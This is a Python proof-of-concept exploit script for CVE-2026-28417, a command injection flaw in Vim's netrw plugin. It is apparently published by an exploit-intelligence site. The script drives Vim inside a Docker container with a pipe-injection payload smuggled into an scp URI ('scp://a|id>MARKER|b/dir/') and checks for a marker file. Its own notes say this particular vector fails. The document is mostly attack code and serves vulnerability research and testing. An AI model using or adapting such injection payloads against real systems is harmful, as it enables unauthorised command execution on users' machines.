#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Vim netrw OS Command Injection — Pipe Injection (Failed)
# CVE            : CVE-2026-28417
# Vendor         : vim
# Product        : Vim
# Affected       : < v9.2.0073 (netrw plugin)
# Type           : CWE-78 - OS Command Injection
# CVSS           : 4.4 (Medium)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Vim netrw OS Command Injection — Pipe Injection PoC (Failed)

Attempts command injection using '|' (pipe) operator instead of
';' (semicolons) or '$()' (command substitution).

Payload: scp://a|id>MARKER|b/dir/

NOTE: This vector FAILS because Vim's ex-command parser intercepts '|'
as a command separator BEFORE the URI reaches netrw. This is a Vim-level
constraint, not a netrw defense.

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-28417
  - https://github.com/vim/vim/commit/79348dbbc09332130f4c86045e1541d68514fcc1
"""

import subprocess
import sys
import uuid

DEFAULT_CONTAINER = "cve-2026-28417-vulnerable"
MARKER = f"CVE-2026-28417-pipe-{uuid.uuid4().hex[:8]}"
WORKDIR = "/workspace"


def docker_exec(container: str, cmd: str, timeout: int = 30) -> tuple[int, str, str]:
    full_cmd = ["docker", "exec", container, "bash", "-c", cmd]
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"


def check_container(container: str) -> bool:
    result = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container],
        capture_output=True, text=True,
    )
    return result.returncode == 0 and "true" in result.stdout.strip()


def exploit_pipe_injection(container: str, marker: str) -> bool:
    """
    Pipe-based command injection.

    Payload: scp://a|id>MARKER|b/dir/

    Shell interprets: ssh a | id>MARKER | b ls -FLa
    The middle command `id>MARKER` executes and writes id output.
    """
    print(f"[*] Payload: scp://a|id>{marker}|b/dir/")
    print()

    # Clean up
    docker_exec(container, f"rm -f {WORKDIR}/{marker}")

    vim_cmd = (
        f"cd {WORKDIR} && "
        f"timeout 20 vim --clean "
        f"-c 'packadd netrw' "
        f"-c 'e scp://a|id>{marker}|b/dir/' "
        f"-c 'qa!' "
        f"</dev/null >/dev/null 2>&1 || true"
    )
    print("[*] Executing Vim with pipe injection payload...")
    docker_exec(container, vim_cmd, timeout=30)

    # Check marker
    rc, stdout, _ = docker_exec(container, f"cat {WORKDIR}/{marker} 2>/dev/null")
    if rc == 0 and stdout.strip():
        print(f"[+] VULNERABLE! Marker file created with contents:")
        print(f"    {stdout.strip()}")
        return True
    else:
        print(f"[-] Marker file not found — pipe vector may have failed")
        return False


def main():
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER

    print("=" * 70)
    print(f"  CVE-2026-28417 — Vector 4: Pipe-based Injection")
    print("=" * 70)
    print()
    print(f"  Target: {container}")
    print(f"  Marker: {MARKER}")
    print()

    if not check_container(container):
        print(f"[-] FATAL: Container '{container}' is not running.")
        sys.exit(1)
    print(f"[+] Container is running.")
    print()

    print("[*] Executing pipe-based injection...")
    print("-" * 50)
    success = exploit_pipe_injection(container, MARKER)
    print("-" * 50)
    print()

    if success:
        print("[+] RESULT: VULNERABLE — pipe injection confirmed")
    else:
        print("[-] RESULT: Pipe vector did not succeed")
        print("    Note: '|' may be handled differently by netrw URL parser.")

    # Cleanup
    docker_exec(container, f"rm -f {WORKDIR}/{MARKER}")
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
